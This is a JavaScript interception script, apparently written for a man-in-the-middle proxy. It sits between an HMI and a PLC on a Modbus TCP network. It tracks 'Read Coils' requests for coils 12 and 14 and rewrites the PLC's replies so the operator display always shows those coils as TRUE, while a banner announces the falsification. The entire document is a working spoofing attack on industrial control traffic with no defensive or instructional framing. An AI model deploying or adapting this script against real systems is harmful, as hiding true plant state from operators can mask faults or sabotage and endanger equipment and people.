// STATE VARIABLES: Tracking transaction IDs for each specific
// coil read request we want to intercept and falsify.
var transactionForCoil14 = -1;
var transactionForCoil12 = -1;

function onData(from, to, data) {
  // A minimal Modbus FC1 response is 10 bytes.
  if (data.length >= 10) {
    var functionCode = data[7];
    var time = new Date().toTimeString().split(' ')[0];
    var isFromHMI = from.indexOf(".11") !== -1;

    // We are only interested in Function Code 1: Read Coils
    if (functionCode == 1) {
      
      if (isFromHMI) {
        var startAddr = (data[8] << 8) | data[9];
        
        // Check if the HMI is asking for one of our target coils
        if (startAddr === 14) {
          transactionForCoil14 = (data[0] << 8) | data[1]; // Store the Transaction ID for coil 14
          log("[" + time + "] Intercepted HMI read for coil 14. Marking TX ID " + transactionForCoil14 + " for spoofing.");
        } else if (startAddr === 12) {
          transactionForCoil12 = (data[0] << 8) | data[1]; // Store the Transaction ID for coil 12
          log("[" + time + "] Intercepted HMI read for coil 12. Marking TX ID " + transactionForCoil12 + " for spoofing.");
        }
      }

      else { 
        var responseId = (data[0] << 8) | data[1];
        var targetFound = false;
        var targetCoil = -1;

        // Check if the response ID matches either of the transactions we're watching
        if (responseId === transactionForCoil14 && transactionForCoil14 !== -1) {
            targetFound = true;
            targetCoil = 14;
            transactionForCoil14 = -1; // Reset state immediately
        } else if (responseId === transactionForCoil12 && transactionForCoil12 !== -1) {
            targetFound = true;
            targetCoil = 12;
            transactionForCoil12 = -1; // Reset state immediately
        }

        if (targetFound) {
          log("╔═══[" + time + "]═══[COIL READ RESPONSE FALSIFIED]═══╗");
          log("║ Intercepted PLC response for coil " + targetCoil + ".");
          log("╠══════════════════════════════════════════════════════╣");
          log("║ [+] ACTION: Forcing coil value to TRUE for the HMI.    ║");
          log("╚══════════════════════════════════════════════════════╝");
          
          data[9] = data[9] | 0x01;
          
          return data;
        }
      }
    }
  }

  return data;
}

// Startup banner
log("");
log("╔══════════════════════════════════════════════════════╗");
log("║         FALSIFY COIL READS SCRIPT ACTIVE             ║");
log("╠══════════════════════════════════════════════════════╣");
log("║ Configuration:                                       ║");
log("║ • Intercepting Modbus 'Read Coils' requests (FC1).   ║");
log("║ • IF HMI reads coil 14 -> Falsify response to TRUE.  ║");
log("║ • IF HMI reads coil 12 -> Falsify response to TRUE.  ║");
log("║ • All other traffic is ALLOWED to pass.              ║");
log("╠══════════════════════════════════════════════════════╣");
log("║ Target: 192.18.1.120 (PLC)                           ║");
log("║ Source: 192.18.1.11 (HMI)                            ║");
log("╚══════════════════════════════════════════════════════╝");
log("");
log("Monitoring Modbus traffic...");